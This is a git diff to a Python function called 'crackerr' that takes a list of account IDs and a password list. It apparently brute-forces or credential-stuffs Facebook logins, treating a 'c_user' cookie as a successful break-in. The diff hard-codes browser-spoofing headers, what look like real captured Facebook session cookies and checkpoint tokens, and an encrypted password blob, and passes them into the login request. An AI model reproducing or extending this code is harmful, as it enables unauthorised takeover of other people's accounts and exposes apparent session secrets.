@@ -484,13 +484,27 @@ def crackerr(ids,passlist):
             "user-agent": us,
             "viewport-width": "980"}
             requu1 = session.get(url1,headers=head)
+            cookies = {
+    'datr': 'OpqVaPyImvfQapu_w36Tb6w9',
+    'sb': 'OpqVaFnrZ4qPlR6kiDeA96JW',
+    'ps_l': '1',
+    'ps_n': '1',
+    'checkpoint': '%7B%22u%22%3A100076124771608%2C%22t%22%3A1761821228%2C%22step%22%3A0%2C%22n%22%3A%22zR8K7Z2gmA4%3D%22%2C%22inst%22%3A833802479167237%2C%22f%22%3A465803052217681%2C%22st%22%3A%22c%22%2C%22aid%22%3Anull%2C%22ca%22%3Anull%2C%22la%22%3A%22%22%2C%22ta%22%3A%221761821236.ch.s%3Apw.tDBEAiANy_zVMFS2rH43v8yXhvwNN0OTiP-6BCNUD2DdO5J3pAIgZmo2xFaBGLcRW8C-Tc2oRA6lS9LCxW4RT04Lay7H9Kg%22%2C%22tfvaid%22%3Anull%2C%22tfvasec%22%3Anull%2C%22sat%22%3Anull%2C%22idg%22%3Afalse%2C%22cidue%22%3A%22%22%2C%22tfuln%22%3Anull%2C%22tfvri%22%3Anull%2C%22ct%22%3A%22ARFOlTbCW2SIgn5yhiuOXYNFXE48wNWZCFrbxZL_ZokoH1G9YLv8vQfCrn4yCjUEtXhPIFbYArPs9CD4p_gVro4qMkkLgc7gtmKahW4WzB0l8x-IcTKpTlsT4ls04uGyomYh_AdHRksyihaGwAjVT1PonBCIRaEFHocUgC2LPW-LRT0f4wWB6WM94g5V4l2FbwmcemeiQE_0lHS-VqbiOhbxP6L4Q6Fy8ar2_OegGGsuvXAO5PUrX46HJzYUAQfZCUkvPmhk4FG5Y-oXpfidafhSDlg39iLHweDMmMLN6apkcI3oqoIPwp72HQY6SIvNoU8t2B5Z4sRAwmPi2HLeCU1hVuvDvZKcUHE3bTTOH-Pmb8jp5hxt87pIAJKEsHg5lOlKvhc5aSlIayk_k39V0BYgWpE%22%2C%22s%22%3A%22AWW9CPHk0ka_oCs1guI%22%2C%22cs%22%3A%5B%5D%2C%22ssp%22%3A1%7D',
+    'locale': 'en_GB',
+    'fr': '0d03NCqOrCpkAOC5C.AWc4St76onCKKbOacCvrA9UMRL2pS1Gs1viTj9fYEqcfQzRPHSc.BolZo6..AAA.0.0.BpA0LR.AWcdVIjgH-4J6K4agwT7zRhIprI',
+    'sfiu': 'AYivGsiWe9DIILuD1G6TuTKUTXAY7wx_26jHwmVnY4WMS2QmA9kQTEl4MmaWfXCWu3itqTkXuOeGJHKthbDhGtvzuvD50iYtHyB1UvE2zYir6OcdxDQ9HFUUEKBXD8MT2JAsnIea723JTPzATtmKOFvnownQ-ihTLAPcscFWAE6Mi5dRmKRettSZgINSAD6crPq-vpPnNwT-cnKDL8YRCnpdDbM7ev1-svq5QFQSFeLzYXVEyU57DHg5ixEGK3WJJB9Y99mSAzMYa5y4zqTPQw8G',
+    'wd': '1126x773',
+}
+
             headers = {
-    'Content-Type': 'application/x-www-form-urlencoded',
-    'Origin': 'https://www.facebook.com',
-    'Referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,bn;q=0.6',
+    'cache-control': 'max-age=0',
+    'content-type': 'application/x-www-form-urlencoded',
     'dpr': '1',
+    'origin': 'https://www.facebook.com',
+    'priority': 'u=0, i',
+    'referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092',
     'sec-ch-prefers-color-scheme': 'dark',
     'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
     'sec-ch-ua-full-version-list': '"Google Chrome";v="141.0.7390.108", "Not?A_Brand";v="8.0.0.0", "Chromium";v="141.0.7390.108"',
@@ -498,7 +512,14 @@ def crackerr(ids,passlist):
     'sec-ch-ua-model': '""',
     'sec-ch-ua-platform': '"Windows"',
     'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
     'viewport-width': '1126',
+    # 'cookie': 'datr=OpqVaPyImvfQapu_w36Tb6w9; sb=OpqVaFnrZ4qPlR6kiDeA96JW; ps_l=1; ps_n=1; checkpoint=%7B%22u%22%3A100076124771608%2C%22t%22%3A1761821228%2C%22step%22%3A0%2C%22n%22%3A%22zR8K7Z2gmA4%3D%22%2C%22inst%22%3A833802479167237%2C%22f%22%3A465803052217681%2C%22st%22%3A%22c%22%2C%22aid%22%3Anull%2C%22ca%22%3Anull%2C%22la%22%3A%22%22%2C%22ta%22%3A%221761821236.ch.s%3Apw.tDBEAiANy_zVMFS2rH43v8yXhvwNN0OTiP-6BCNUD2DdO5J3pAIgZmo2xFaBGLcRW8C-Tc2oRA6lS9LCxW4RT04Lay7H9Kg%22%2C%22tfvaid%22%3Anull%2C%22tfvasec%22%3Anull%2C%22sat%22%3Anull%2C%22idg%22%3Afalse%2C%22cidue%22%3A%22%22%2C%22tfuln%22%3Anull%2C%22tfvri%22%3Anull%2C%22ct%22%3A%22ARFOlTbCW2SIgn5yhiuOXYNFXE48wNWZCFrbxZL_ZokoH1G9YLv8vQfCrn4yCjUEtXhPIFbYArPs9CD4p_gVro4qMkkLgc7gtmKahW4WzB0l8x-IcTKpTlsT4ls04uGyomYh_AdHRksyihaGwAjVT1PonBCIRaEFHocUgC2LPW-LRT0f4wWB6WM94g5V4l2FbwmcemeiQE_0lHS-VqbiOhbxP6L4Q6Fy8ar2_OegGGsuvXAO5PUrX46HJzYUAQfZCUkvPmhk4FG5Y-oXpfidafhSDlg39iLHweDMmMLN6apkcI3oqoIPwp72HQY6SIvNoU8t2B5Z4sRAwmPi2HLeCU1hVuvDvZKcUHE3bTTOH-Pmb8jp5hxt87pIAJKEsHg5lOlKvhc5aSlIayk_k39V0BYgWpE%22%2C%22s%22%3A%22AWW9CPHk0ka_oCs1guI%22%2C%22cs%22%3A%5B%5D%2C%22ssp%22%3A1%7D; locale=en_GB; fr=0d03NCqOrCpkAOC5C.AWc4St76onCKKbOacCvrA9UMRL2pS1Gs1viTj9fYEqcfQzRPHSc.BolZo6..AAA.0.0.BpA0LR.AWcdVIjgH-4J6K4agwT7zRhIprI; sfiu=AYivGsiWe9DIILuD1G6TuTKUTXAY7wx_26jHwmVnY4WMS2QmA9kQTEl4MmaWfXCWu3itqTkXuOeGJHKthbDhGtvzuvD50iYtHyB1UvE2zYir6OcdxDQ9HFUUEKBXD8MT2JAsnIea723JTPzATtmKOFvnownQ-ihTLAPcscFWAE6Mi5dRmKRettSZgINSAD6crPq-vpPnNwT-cnKDL8YRCnpdDbM7ev1-svq5QFQSFeLzYXVEyU57DHg5ixEGK3WJJB9Y99mSAzMYa5y4zqTPQw8G; wd=1126x773',
 }
 
             params = {
@@ -533,7 +554,13 @@ def crackerr(ids,passlist):
     'encpass': '#PWD_BROWSER:5:1761817301:AYxQALT5eVLOXX8kNiZGrwV2U50ClqDxfSQDZfnfpjbnFT5wjKXGZwUcwsDMErKcet0GTQBt0PSEvKvavi1pX/fn/1albUSEhYwlyuNVtUPoMXbmsOg54XY9JJ8a1h+PIQkS3budWuOoTw==',
 }
 
-            response = requests.post('https://www.facebook.com/login/device-based/regular/login/', params=params, headers=headers, data=data)
+            response = requests.post(
+                'https://www.facebook.com/login/device-based/regular/login/',
+                params=params,
+                cookies=cookies,
+                headers=headers,
+                data=data,
+            )
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
                 # Format cookies properly
